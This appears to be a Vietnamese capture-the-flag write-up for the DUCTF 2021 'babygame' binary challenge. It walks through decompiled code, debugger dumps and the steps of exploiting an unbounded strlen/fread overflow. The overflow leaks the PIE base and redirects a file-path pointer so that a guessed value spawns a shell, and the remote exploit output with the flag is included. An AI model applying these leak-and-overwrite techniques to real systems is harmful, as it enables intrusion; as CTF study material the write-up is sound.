# Phân tích file

```python
babygame: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=eb63ec1c73b262295cbcef5af1abdbbab2424b80, for GNU/Linux 4.4.0, not stripped
```

```python
		Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# Reverse file

- Ta có hàm main như sau.
    
    ```python
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      int v3; // [rsp+Ch] [rbp-4h]
    
      init(argc, argv, envp);
      puts("Welcome, what is your name?");
      read(0, NAME, 0x20uLL);
      RANDBUF = "/dev/urandom";
      while ( 1 )
      {
        while ( 1 )
        {
          print_menu();
          v3 = get_num();
          if ( v3 != 1337 )
            break;
          game();
        }
        if ( v3 > 1337 )
        {
    LABEL_10:
          puts("Invalid choice.");
        }
        else if ( v3 == 1 )
        {
          set_username();
        }
        else
        {
          if ( v3 != 2 )
            goto LABEL_10;
          print_username();
        }
      }
    }
    ```
    
    - Yêu cầu ta nhập name với size 0x20 và gán "/dev/urandom" cho RANDBUF.
- Bài có các chức năng chính như sau
    
    ```python
    Welcome, what is your name?
    dinhvu
    1. Set Username
    2. Print Username
    >
    ```
    
- Set Username:
    
    ```python
    size_t set_username()
    {
      FILE *v0; // rbx
      size_t v1; // rax
    
      puts("What would you like to change your username to?");
      v0 = stdin;
      v1 = strlen(NAME);
      return fread(NAME, 1uLL, v1, v0);
    }
    ```
    
    - Ta thấy nó sẽ lấy độ dài của NAME input ta nhập vào làm size cho lần fread tiếp theo. Ở đây nếu NAME ta nhập 0x20 mà sau nó còn 1 địa chỉ nào đó thì strlen nó sẽ đọc đến khi nào gặp null nên strlen có thể trả về 1 giá trị lớn hơn 0x20 ⇒ Ta có thể nhập tràn qua các biến khác.
- Print Username:
    
    ```python
    int print_username()
    {
      return puts(NAME);
    ```
    
    - Chỉ đơn giản là in ra màn hình chuỗi NAME.
    

# Exploit

```python
pwndbg> x/10xg 0x5555555580a0
0x5555555580a0 <NAME>:  0x6161616161616161      0x000a616161616161
0x5555555580b0 <NAME+16>:       0x0000000000000000      0x0000000000000000
0x5555555580c0 <RANDBUF>:       0x0000555555556024      0x0000000000000000
```

- Ta có thể thấy NAME và RANDBUF là 2 vùng nhớ kề nhau nếu như ta nhập NAME là "a"*0x20 thì sẽ như sau
    
    ```python
    pwndbg> x/10xg 0x5555555580a0
    0x5555555580a0 <NAME>:  0x6161616161616161      0x6161616161616161 
    0x5555555580b0 <NAME+16>:       0x6161616161616161      0x6161616161616161
    0x5555555580c0 <RANDBUF>:       0x0000555555556024      0x0000000000000000
    ```
    
- Ta có thể thấy nếu ta dùng Print Username ta có thể leak được giá trị của RANDBUF và từ đó tính pie.
- Ta cũng có thể overflow RANDBUF qua hàm Set Username vì strlen(NAME) sẽ trả về 0x26 thay về 0x20 do đó ta có thể control được giá trị của RANDBUF.
- Tiếp theo là vào hàm game thông qua lựa chọn 1337.
    
    ```python
    unsigned __int64 game()
    {
      FILE *stream; // [rsp+8h] [rbp-18h]
      int ptr; // [rsp+14h] [rbp-Ch] BYREF
      unsigned __int64 v3; // [rsp+18h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      stream = fopen(RANDBUF, "rb");
      fread(&ptr, 1uLL, 4uLL, stream);
      printf("guess: ");
      if ( (unsigned int)get_num() == ptr )
        system("/bin/sh");
      return v3 - __readfsqword(0x28u);
    }
    ```
    
    - Ta có thể thấy nó sẽ đọc 4 bytes từ RANDBUF mà RANDBUF ban đầu là "/dev/urandom" nên ta sẽ không đoán được, vậy ý tưởng sẽ là thay đổi biến RANDBUF thành 1 địa chỉ chứa chuỗi cố định thì các lần sau chạy sẽ luôn cho ra kết quả mà ta kiểm soát được và get shell.
    
    ```python
    pwndbg> search "/bin/sh"
    babygame        0x5555555560a3 0x68732f6e69622f /* '/bin/sh' */
    babygame
    ```
    
    - Sau khi xem qua thì mình thấy trong chương trình có 1 địa chỉ chứa "/bin/sh" nên mình sẽ dùng địa chỉ này ghi vào RANDBUF và kết quả nó sẽ luôn là 0x464c457f.
    
    ```python
    *RAX  0x464c457f
     ► 0x555555555425 <game+120>    cmp    dword ptr [rbp - 0x1c], eax
    ```
    
    - Giờ ta chỉ cần nhập guess là str(0x464c457f) sẽ lên được shell.

```python
[+] Opening connection to pwn-2021.duc.tf on port 31907: Done
[*] leak: 0x556b03e2b024
[*] pie: 0x556b03e29000
[*] bin_sh: 0x556b03e2b0a3
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{whats_in_a_name?_5aacfc58}
$
```
